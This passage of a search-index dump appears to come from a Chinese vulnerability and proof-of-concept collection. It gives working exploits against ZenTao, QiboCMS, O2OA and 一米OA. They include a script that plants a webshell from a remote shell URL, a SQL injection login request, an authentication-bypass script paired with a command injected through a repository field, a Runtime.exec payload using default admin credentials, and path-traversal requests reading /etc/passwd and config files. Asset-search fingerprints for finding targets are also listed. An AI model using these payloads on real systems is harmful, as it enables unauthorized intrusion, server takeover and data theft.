\"HTTP://\" + options[1] elif options[0] == \"ftp\": shell_url = \"ftp://\" + options[1] else: print(\"\\033[31m[x] 请使用正确的请求地址 \\033[0m\") sys.exit(0) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\":\"zentaosid={}\".format(zentaosid) } shell_url_base = str((base64.b64encode(shell_url.encode('utf-8'))),'utf-8') vuln_url = target_url + \"/www/index.php?m=client\u0026f=download\u0026version=test\u0026link={}\".format(shell_url_base) print(\"\\033[32m[o] 请求漏洞url：{}\\033[0m\".format(vuln_url)) try: response = requests.get(url=vuln_url, timeout=20, headers=headers) if \"保存成功\" in response.text: print(\"\\033[32m[o] 成功写入Webshell，URL地址为：{}/www/data/client/test/Webshell_name.php\\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 恶意文件下载失败 \\033[0m\") except: print(\"\\033[31m[x] 恶意文件下载失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) shell_url = str(input(\"\\033[35mShell \u003e\u003e\u003e \\033[0m\")) zentaosid = str(input(\"\\033[35mZentaosid \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) POC_2(target_url, shell_url, zentaosid) ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-12.4.2-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-c-2020-121325/:5:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-12.4.2-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-c-2020-121325/"},{"categories":null,"content":"禅道 V16.5 SQL 注入 CNVD-2022-42853 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-v16.5-sql-%E6%B3%A8%E5%85%A5-cnvd-2022-42853/:0:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-v16.5-sql-%E6%B3%A8%E5%85%A5-cnvd-2022-42853/"},{"categories":null,"content":"漏洞描述 禅道是一款专业的国产开源研发项目管理软件，集产品管理，项目管理， 质量管理，文档管理，组织管理和事务管理于一体，完整覆盖了研发项目管理的核心流程，管理思想基于国际流行的敏捷项目管理方法-Scrum，在遵循其价值观的基础上，结合国内项目研发的现状，整合了任务管理，需要管理，Bug 管理，用例管理等多种功能，覆盖软件从计划到发布的整个生命周期。 禅道 V16.5 未对输入的 account 参数内容作过滤校验，导致攻击者拼接恶意 SQL 语句执行。 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-v16.5-sql-%E6%B3%A8%E5%85%A5-cnvd-2022-42853/:1:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-v16.5-sql-%E6%B3%A8%E5%85%A5-cnvd-2022-42853/"},{"categories":null,"content":"环境搭建 下载环境： https://www.zentao.net/dl/zentao/16.5/ZenTaoPMS.16.5.win64.exe ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-v16.5-sql-%E6%B3%A8%E5%85%A5-cnvd-2022-42853/:2:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-v16.5-sql-%E6%B3%A8%E5%85%A5-cnvd-2022-42853/"},{"categories":null,"content":"漏洞复现 报错型注入 Payload： admin' and updatexml(1,concat(0x7e,(user),0x7e),1) and '1'='1 poc： POST /zentao/user-login.html HTTP/1.1 Host: 127.0.0.1 Content-Type: application/x-www-form-urlencoded account=admin%27+and++updatexml%281%2Cconcat%280x1%2Cuser%28%29%29%2C1%29+and+%271%27%3D%271 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-v16.5-sql-%E6%B3%A8%E5%85%A5-cnvd-2022-42853/:3:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-v16.5-sql-%E6%B3%A8%E5%85%A5-cnvd-2022-42853/"},{"categories":null,"content":"禅道 项目管理系统远程命令执行漏洞 CNVD-2023-02709 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2023-02709/:0:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2023-02709/"},{"categories":null,"content":"漏洞描述 禅道项目管理系统存在远程命令执行漏洞，该漏洞源于在认证过程中未正确退出程序，导致了认证绕过，并且后台中有多种执行命令的方式，攻击者可利用该漏洞在目标服务器上注入任意命令，实现未授权接管服务器。 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2023-02709/:1:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2023-02709/"},{"categories":null,"content":"漏洞影响 杭州易软共创网络科技有限公司 禅道项目管理系统 \u003e=17.4，\u003c=18.0.beta1（开源版） 杭州易软共创网络科技有限公司 禅道项目管理系统 \u003e=7.4，\u003c=8.0.beta1（企业版） 杭州易软共创网络科技有限公司 禅道项目管理系统 \u003e=3.4，\u003c=4.0.beta1（旗舰版） ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2023-02709/:2:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2023-02709/"},{"categories":null,"content":"漏洞复现 权限绕过： import requests header={ 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5408.146 Safari/537.36', } def bypasscookie(url,session): target=url+\"/index.php?m=misc\u0026f=captcha\u0026sessionVar=user\" r=session.get(target,headers=header) zentaosid=r.cookies.get_dict()['zentaosid'] print(zentaosid) header[\"Cookie\"]=\"zentaosid=\"+zentaosid resp=session.get(url+\"/index.php?m=my\u0026f=index\",headers=header) if \"/shandao/www/index.php?m=user\u0026f=login\" not in resp.text: print(\"绕过登陆验证\") else: print(\"无法绕过验证\") if __name__ == '__main__': url=\"http://127.0.0.1:8081/shandao/www/\" session=requests.Session() bypasscookie(url,session) 后台RCE： 先创建Gitlab代码库,拿到repoID POST /shandao/www/index.php?m=repo\u0026f=create\u0026objectID=0\u0026tid=rmqcl0ss HTTP/1.1 Host: 127.0.0.1:8081 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://127.0.0.1:8081/shandao/www/index.php?m=repo\u0026f=create\u0026objectID=0\u0026tid=rmqcl0ss Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 144 Origin: http://127.0.0.1:8081 Connection: close Cookie: lang=zh-cn; device=desktop; theme=default; tab=devops; preCaseLibID=1; lastCaseLib=1; checkedItem=; goback=%7B%22devops%22%3A%22http%3A%5C%2F%5C%2F127.0.0.1%3A8081%5C%2Fshandao%5C%2Fwww%5C%2Findex.php%3Fm%3Drepo%26f%3Dbrowse%26repoID%3D1%26branchID%3D%26objectID%3D0%26tid%3Dvwy3ton6%22%7D; zentaosid=r3094u5448167shtdrur4c7b6q; repoBranch=master; windowWidth=1453; windowHeight=844 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin product%5B%5D=1\u0026SCM=Gitlab\u0026serviceProject=wangnima\u0026name=wangnima2333\u0026path=\u0026encoding=utf-8\u0026client=\u0026account=\u0026password=\u0026encrypt=base64\u0026desc=\u0026uid=63e4a18218a68 创建好后，去到 http://127.0.0.1:8081/shandao/www/index.php?m=repo\u0026f=maintain\u0026tid=rmqcl0ss查看repoID并进入编辑 POST /shandao/www/index.php?m=repo\u0026f=edit\u0026repoID=8\u0026objectID=0\u0026tid=rmqcl0ss HTTP/1.1 Host: 127.0.0.1:8081 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://127.0.0.1:8081/shandao/www/index.php?m=repo\u0026f=edit\u0026repoID=8\u0026objectID=0\u0026tid=rmqcl0ss Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 222 Origin: http://127.0.0.1:8081 Connection: close Cookie: lang=zh-cn; device=desktop; theme=default; tab=devops; preCaseLibID=1; lastCaseLib=1; checkedItem=; goback=%7B%22devops%22%3A%22http%3A%5C%2F%5C%2F127.0.0.1%3A8081%5C%2Fshandao%5C%2Fwww%5C%2Findex.php%3Fm%3Drepo%26f%3Dbrowse%26repoID%3D1%26branchID%3D%26objectID%3D0%26tid%3Dvwy3ton6%22%7D; zentaosid=r3094u5448167shtdrur4c7b6q; repoBranch=master; windowWidth=1453; windowHeight=844 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin product%5B%5D=1\u0026SCM=Subversion\u0026serviceHost=\u0026name=wangnima2333\u0026path=http%3A%2F%2F123.4.5.6\u0026encoding=utf-8\u0026client=%60open+%2FSystem%2FApplications%2FCalculator.app%60\u0026account=\u0026password=\u0026encrypt=base64\u0026desc=\u0026uid=63e4a26b5fd65 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2023-02709/:3:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2023-02709/"},{"categories":null,"content":"漏洞修复 进行官方升级：https://www.zentao.net/book/zentaoprohelp/41.html 安全产品升级：部分厂商安全产品具备识别该漏洞功能，进行版本升级至最新版。 临时防护措施：可在 module/common/model.php 文件中 echo $endResponseException-\u003egetContent();后面加上 exit(); 来修复权限绕过漏洞。 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2023-02709/:4:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2023-02709/"},{"categories":null,"content":"齐博CMS V7 job.php 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E9%BD%90%E5%8D%9Acms-v7-job.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%BD%90%E5%8D%9Acms-v7-job.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 QiboCMS V7版本/do/job.php页面URL参数过滤不严，导致可以下载系统任意文件，获取系统敏感信息。 ","date":"0001-01-01","objectID":"/%E9%BD%90%E5%8D%9Acms-v7-job.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%BD%90%E5%8D%9Acms-v7-job.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 齐博CMS V7 ","date":"0001-01-01","objectID":"/%E9%BD%90%E5%8D%9Acms-v7-job.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%BD%90%E5%8D%9Acms-v7-job.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"齐博软件-v7\" ","date":"0001-01-01","objectID":"/%E9%BD%90%E5%8D%9Acms-v7-job.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%BD%90%E5%8D%9Acms-v7-job.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 漏洞分析 /inc/job/download.php $url=trim(base64_decode($url)); $fileurl=str_replace($webdb[www_url],\"\",$url); if( eregi(\".php\",$fileurl) \u0026\u0026 is_file(ROOT_PATH.\"$fileurl\") ){ die(\"ERR\"); } if(!$webdb[DownLoad_readfile]){ $fileurl=strstr($url,\"://\")?$url:tempdir($fileurl); header(\"location:$fileurl\"); exit; } $webdb[upfileType] = str_replace(' ','|',$webdb[upfileType]); if( $webdb[local_download] \u0026\u0026 is_file(ROOT_PATH.$fileurl) \u0026\u0026 eregi(\"($webdb[upfileType])$\",$fileurl) ){ $filename=basename($fileurl); $filetype=substr(strrchr($filename,'.'),1); $_filename=preg_replace(\"/([\\d]+)_(200[\\d]+)_([^_]+)\\.([^\\.]+)/is\",\"\\\\3\",$filename); if(eregi(\"^([a-z0-9=]+)$\",$_filename)\u0026\u0026!eregi(\"(jpg|gif|png)$\",$filename)){ $filename=urldecode(base64_decode($_filename)).\".$filetype\"; } ob_end_clean(); header('Last-Modified: '.gmdate('D, d M Y H:i:s',time()).' GMT'); header('Pragma: no-cache'); header('Content-Encoding: none'); header('Content-Disposition: attachment; filename='.$filename); header('Content-type: '.$filetype); header('Content-Length: '.filesize(ROOT_PATH.\"$fileurl\")); readfile(ROOT_PATH.\"$fileurl\"); exit; } url base64解码,匹配后缀 如果是php结尾的就退出 在windows下能用xxx.ph\u003c 绕过 然后经过一系列的正则后会下载文件。 if( eregi(\".php\",$fileurl) \u0026\u0026 is_file(ROOT_PATH.\"$fileurl\") ){ die(\"ERR\"); } ","date":"0001-01-01","objectID":"/%E9%BD%90%E5%8D%9Acms-v7-job.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%BD%90%E5%8D%9Acms-v7-job.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC /do/job.php?job=download\u0026url=ZGF0YS9jb25maWcucGg8 ","date":"0001-01-01","objectID":"/%E9%BD%90%E5%8D%9Acms-v7-job.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E9%BD%90%E5%8D%9Acms-v7-job.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"O2OA invoke 后台远程命令执行漏洞 CNVD-2020-18740 ","date":"0001-01-01","objectID":"/o2oa-invoke-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2020-18740/:0:0","tags":null,"title":"","uri":"/o2oa-invoke-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2020-18740/"},{"categories":null,"content":"漏洞描述 O2OA是一款开源免费的企业及团队办公平台，提供门户管理、流程管理、信息管理、数据管理四大平台,集工作汇报、项目协作、移动OA、文档分享、流程审批、数据协作等众多功能，满足企业各类管理和协作需求。 O2OA系统invoke 接口存在远程代码执行漏洞。攻击者可利用漏洞执行任意代码。 ","date":"0001-01-01","objectID":"/o2oa-invoke-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2020-18740/:1:0","tags":null,"title":"","uri":"/o2oa-invoke-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2020-18740/"},{"categories":null,"content":"漏洞影响 O2OA ","date":"0001-01-01","objectID":"/o2oa-invoke-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2020-18740/:2:0","tags":null,"title":"","uri":"/o2oa-invoke-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2020-18740/"},{"categories":null,"content":"网络测绘 title==\"O2OA\" ","date":"0001-01-01","objectID":"/o2oa-invoke-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2020-18740/:3:0","tags":null,"title":"","uri":"/o2oa-invoke-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2020-18740/"},{"categories":null,"content":"漏洞复现 登录页面 默认密码登录后台 xadmin/o2 在应用中找到服务管理，创建接口代码执行系统命令 var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\"id\").getInputStream())); var result = []; while (true) { var oneline = bufReader.readLine(); result.push(oneline); if (!oneline) break; } var result = { \"Result\": result }; this.response.setBody(result, \"application/json\"); 请求包 POST /x_program_center/jaxrs/invoke?v=6.3 HTTP/1.1 Authorization: PfyuxmzgIzrrkjVKSmRBJ4uCkH5tYmpq50QnO7mEHhA {\"id\":\"cmd\",\"name\":\"cmd\",\"enableToken\":false,\"alias\":\"\",\"description\":\"\",\"validated\":true,\"enable\":true,\"text\":\"var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\\\"id\\\").getInputStream()));\\n\\nvar result = [];\\nwhile (true) {\\n var oneline = bufReader.readLine();\\n result.push(oneline);\\n if (!oneline) break;\\n}\\nvar result = { \\\"Result\\\": result };\\nthis.response.setBody(result, \\\"application/json\\\"); \",\"remoteAddrRegex\":\"\",\"createTime\":\"2022-08-27 04:39:18\",\"updateTime\":\"2022-08-27 04:39:18\"} 创建成功后访问接口执行系统命令 /x_program_center/jaxrs/invoke/cmd/execute ","date":"0001-01-01","objectID":"/o2oa-invoke-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2020-18740/:4:0","tags":null,"title":"","uri":"/o2oa-invoke-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2020-18740/"},{"categories":null,"content":"O2OA open 后台任意文件读取漏洞 ","date":"0001-01-01","objectID":"/o2oa-open-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/o2oa-open-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 O2OA是一款开源免费的企业及团队办公平台，提供门户管理、流程管理、信息管理、数据管理四大平台,集工作汇报、项目协作、移动OA、文档分享、流程审批、数据协作等众多功能，满足企业各类管理和协作需求。 O2OA系统 open 接口存在任意文件读取漏洞。攻击者可利用漏洞读取任意文件。 ","date":"0001-01-01","objectID":"/o2oa-open-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/o2oa-open-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 O2OA ","date":"0001-01-01","objectID":"/o2oa-open-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/o2oa-open-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title==\"O2OA\" ","date":"0001-01-01","objectID":"/o2oa-open-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/o2oa-open-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 默认密码登录后台 xadmin/o2 (o2oa@2022), 验证POC POST /x_program_center/jaxrs/config/open?v=6.3 Authorization: PfyuxmzgIzq74NYhOcQ5NGbegmqb8H4y50QnO7mEHhA {\"fileName\":\"../../../etc/passwd\"} ","date":"0001-01-01","objectID":"/o2oa-open-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/o2oa-open-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"一米OA getfile.jsp 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E4%B8%80%E7%B1%B3oa-getfile.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E4%B8%80%E7%B1%B3oa-getfile.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 一米OA getfile.jsp文件过滤不足，导致任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E4%B8%80%E7%B1%B3oa-getfile.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E4%B8%80%E7%B1%B3oa-getfile.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 一米OA ","date":"0001-01-01","objectID":"/%E4%B8%80%E7%B1%B3oa-getfile.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E4%B8%80%E7%B1%B3oa-getfile.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"一米OA\" ","date":"0001-01-01","objectID":"/%E4%B8%80%E7%B1%B3oa-getfile.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E4%B8%80%E7%B1%B3oa-getfile.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 产品页面 出现漏洞的文件 \u003c%@ page contentType=\"text/html;charset=utf-8\" %\u003e \u003c%@page import=\"cn.js.fan.util.*\" %\u003e \u003c%@page import=\"cn.js.fan.web.Global\" %\u003e \u003c%@page import=\"com.redmoon.oa.*\" %\u003e \u003c%@page import=\"java.io.*\" %\u003e \u003cjsp:useBean id=\"fchar\" scope=\"page\" class=\"cn.js.fan.util.StrUtil\"/\u003e \u003cjsp:useBean id=\"fsecurity\" scope=\"page\" class=\"cn.js.fan.security.SecurityUtil\"/\u003e \u003cjsp:useBean id=\"privilege\" scope=\"page\" class=\"com.redmoon.oa.pvg.Privilege\"/\u003e \u003c% String user = ParamUtil.get(request, \"user\"); if (\"\".equals(user)) { if (!privilege.isUserPrivValid(request, \"read\")) { System.out.println(\"警告非法用户，你无访问此页的权限！\"); return; } } String filename = ParamUtil.get(request, \"filename\"); String extname = request.getParameter(\"extname\"); String prop = request.getParameter(\"prop\"); if (filename == null) { System.out.println(\"缺少文件名！\"); return; } filename = filename + \".\" + extname; Config cfg = new Config(); String noticefilepath; if (\"activex\".equals(prop)) { noticefilepath = prop; } else { noticefilepath = cfg.get(prop); } String filePath = Global.getRealPath() + \"/\" + noticefilepath + \"/\" + filename; if (\"li\".equals(prop)) { filePath = Global.getRealPath() + \"WEB-INF/\" + prop + filename; } response.setContentType(\"application/\" + extname); response.setHeader(\"Content-disposition\", \"attachment; filename=\" + filename); BufferedInputStream bis = null; BufferedOutputStream bos = null; try { bis = new BufferedInputStream(new FileInputStream(filePath)); bos = new BufferedOutputStream(response.getOutputStream()); byte[] buff = new byte[2048]; int bytesRead; while (-1 != (bytesRead = bis.read(buff, 0, buff.length))) { bos.write(buff, 0, bytesRead); } } catch (final IOException e) { System.out.println(\"出现IOException.\" + e); } finally { if (bis != null) bis.close(); if (bos != null) bos.close(); } out.clear(); out = pageContext.pushBody(); %\u003e 首先验证 user 传参是否为空, 需要对 user 参数任意赋值 if (\"\".equals(user)) { if (!privilege.isUserPrivValid(request, \"read\")) { System.out.println(\"警告非法用户，你无访问此页的权限！\"); return; } } 接着接受3个参数 filename, extname, prop String filename = ParamUtil.get(request, \"filename\"); String extname = request.getParameter(\"extname\"); String prop = request.getParameter(\"prop\"); 接着判断 prop 是否为 activex, 不等于则会去调用系统默认配置的路径 所以filename和extname这两个参数我们可以控制。构造请求前台任意文件读取 String filePath = Global.getRealPath() + \"/\" + noticefilepath + \"/\" + filename; if (\"li\".equals(prop)) { filePath = Global.getRealPath() + \"WEB-INF/\" + prop + filename; } 验证POC /public/getfile.jsp?user=1\u0026prop=activex\u0026filename=../public/getfile\u0026extname=jsp 